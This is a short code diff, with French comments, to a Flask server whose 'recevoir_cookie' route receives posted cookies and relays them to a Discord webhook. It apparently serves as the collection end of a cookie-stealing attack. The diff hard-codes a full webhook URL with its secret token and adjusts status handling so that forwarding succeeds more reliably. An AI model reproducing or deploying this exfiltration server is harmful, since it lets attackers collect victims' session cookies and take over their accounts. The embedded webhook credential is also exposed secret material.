@@ -7,7 +7,8 @@ import traceback
 app = Flask(__name__)
 CORS(app)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/..."  # Mets ton webhook ici
+# Remplace ce webhook par le tien :
+WEBHOOK_URL = "https://discord.com/api/webhooks/1399751822515765360/yMPVxF07xUsKKtaeXDMnmO2mcjQm0DBYqhv8fN3Z7eR75ydo39qKyzDTrIQoFo3yGDXu"
 
 @app.route("/", methods=["POST"])
 def recevoir_cookie():
@@ -27,12 +28,12 @@ def recevoir_cookie():
 
         print("Webhook Discord status:", response.status_code, response.text)
 
-        if response.status_code == 204:
+        if response.status_code in [200, 204]:
             print("✅ Cookie envoyé au webhook Discord")
             return "Cookie reçu et envoyé", 200
         else:
             print("⚠️ Erreur envoi webhook Discord")
-            return "Erreur webhook Discord", 500
+            return f"Erreur webhook Discord ({response.status_code})", 500
 
     except Exception as e:
         print("🔥 Exception capturée :")
